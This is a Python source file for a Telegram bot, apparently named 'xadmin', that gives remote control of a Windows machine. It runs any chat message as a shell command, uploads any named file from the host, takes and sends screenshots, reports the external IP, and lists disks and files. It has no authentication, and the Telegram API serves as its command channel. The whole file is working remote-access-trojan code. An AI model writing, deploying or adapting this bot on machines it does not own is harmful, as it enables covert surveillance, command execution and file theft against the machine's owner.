import subprocess as s
import os
import requests as r
from mss import mss
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters


def app():
  #This would show us that the bot is typing...
  from functools import wraps

  def send_action(action):
      def decorator(func):
          @wraps(func)
          def command_func(update, context, *args, **kwargs):
              context.bot.send_chat_action(chat_id=update.effective_message.chat_id, action=action)
              return func(update, context,  *args, **kwargs)
          return command_func
      return decorator
  ###



  # Define your Telegram bot token
  TOKEN = #ENTER YOUR TOKEN HERE



  # Define the command handlers
  @send_action('typing')
  def start(update, context):
      update.message.reply_html(f'''<pre class="spoiler">Hi {(update.effective_user.username).upper()}
  Type help for commands</pre>
  ''')


  @send_action('typing')
  def main(update, context):
    text : str = update.message.text
    chatid = update.effective_chat.id

    # if msg_handler(text) != str:
    #   return context.bot.send_document(chat_id=chatid, document=msg_handler(text))

  #document send remotely
    if text.startswith('@'):
      file_name = text.replace("@","")
      if os.path.isfile(f"{file_name}"):
        print("sending")
        # url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        # data = {"chat_id" : chatid}
        # files = {"document" : open(file_name, 'rb')}
        # return r.post(url,data=data,files=files)
        with open(file_name, 'rb') as f:
          return context.bot.send_document(chat_id=chatid, document=f)

      else :
        return update.message.reply_html("<pre>the file does not exists</pre>")

  #   elif text.startswith("#"):
  #     return update.message.reply_html(random_cmd())

    else:
      try:
      #   output = msg_handler(text)
        return update.message.reply_text(shell(text))
      except Exception as e:
        return update.message.reply_text(f"ERROR : {e}")


  #directory changer
  def change_dir(inp:str) -> str:
      cwd = inp.split(" ")
      try:
          # if there is space in between the file-name, so replace it by #
          if '#' in cwd[1]:
              dir = cwd[1].replace("#", " ")
              os.chdir(dir)
          else:
              os.chdir(cwd[1])
              return os.getcwd()
      except Exception as e:
        return e

  #for shell based functionings
  def shell(inp : str) :
    if "cd" in inp:
        new_dir = change_dir(inp)
        return new_dir
        # await update.message.reply_text(new_dir)
    else:
        out = s.run(inp,text = True, shell=True, capture_output=True)
        final = out.stdout.replace("\n\n\n\n","\n\n")
        if out.returncode == 0:
            # await update.message.reply_text(final)
            return final
        else:
            return (f"ERROR : {out.stderr}")


  def get_ip(update, context):
      ip_address = r.get("https://api.ipify.org").text
      return update.message.reply_text(f"External IP Address : {ip_address}")


  def screenshot(update, context):
      chatid = update.effective_chat.id
      try:
        with mss() as sct:
          # ss = sct.shot()
          sct.shot()
          file_name = "monitor-1.png"
          if os.path.isfile(f"{file_name}"):
              print("sending")
              with open(file_name, 'rb') as f:
                  return context.bot.send_document(chat_id=chatid, document=f)

          # return ss
      except Exception as e:
        return update.message.reply_text(f"ERROR : {e}")
      

  ##--------------------------------------------##
  import random as rand
  from bs4 import BeautifulSoup as b

  def random_cmd(update, context):
    res = r.get(r'https://www.computerhope.com/overview.htm')
    soup = b(res.content, features="html.parser")

    #total 143 windows commands are there
    fin = soup.find_all(class_= "tcw")

    choice = rand.randint(0,143)
    desc = fin[choice].text.split("\n")[2]
    cmd = fin[choice].a.text

    return update.message.reply_html(f"<b>{cmd}</b> : {desc}")

  ##--------------------------------------------##


  def help(update, context):
    return update.message.reply_html('''List of useful commands :

  Start : Sends you a greeting <pre>/start</pre>   
                                                                      
  Screenshot : <pre>/ss</pre>

  Remotely File Sharing : <pre>using @ before file_name(no spaces)</pre>

  Random Windows Command : <pre>/random</pre>

  IP Address Extraction : <pre>/ip</pre>

  List all Logical-Disks attached : <pre>/list</pre>  

  List all files only : <pre>/files</pre>                                                      

  View Documentation : https://github.com/xprabhudayal/xadmin?tab=readme-ov-file

    ''')


  # def msg_handler(text : str):
  #   if text == 'ip' :
  #     return get_ip()
  #   elif text.lower() == 'help':
  #     return '''list of useful commands (case sensitive)

  # Screenshot : <pre>ss or screenshot</pre>

  # Remotely File Sharing : <pre>using @ before file_name(no spaces)</pre>

  # Random Windows Command : <pre>#</pre>

  # IP Address Extraction : <pre>ip</pre>

  # Support : https://github.com/xprabhudayal/xadmin?tab=readme-ov-file

  #   '''
  #   elif text.lower() == 'ss'  or  text.lower() == 'screenshot':
  #     try:
  #       with mss() as sct:
  #         ss = sct.shot()
  #         return ss
  #     except Exception as e:
  #       return e
  #   else :
  #     try:
  #       return shell(text)
  #     except Exception as e:
  #       return e



  def logical_disk(update, context):
    return update.message.reply_text(shell("wmic logicaldisk get volumename, name")) 

  def files(update, context):
    return update.message.reply_text(shell("dir /b"))


  updater = Updater(TOKEN, use_context=True)

  dispatcher = updater.dispatcher

  # Add command handlers
  dispatcher.add_handler(CommandHandler("start", start))
  dispatcher.add_handler(CommandHandler("help", help))
  dispatcher.add_handler(CommandHandler("ip", get_ip))
  dispatcher.add_handler(CommandHandler("files", files))
  dispatcher.add_handler(CommandHandler("list", logical_disk))
  dispatcher.add_handler(CommandHandler("ss", screenshot))
  dispatcher.add_handler(CommandHandler("random", random_cmd))

  dispatcher.add_handler(MessageHandler(Filters.text, main))
  dispatcher.add_handler(MessageHandler(Filters.document, main))

  # Start the Bot
  print("running ...")
  updater.start_polling()
  updater.idle()
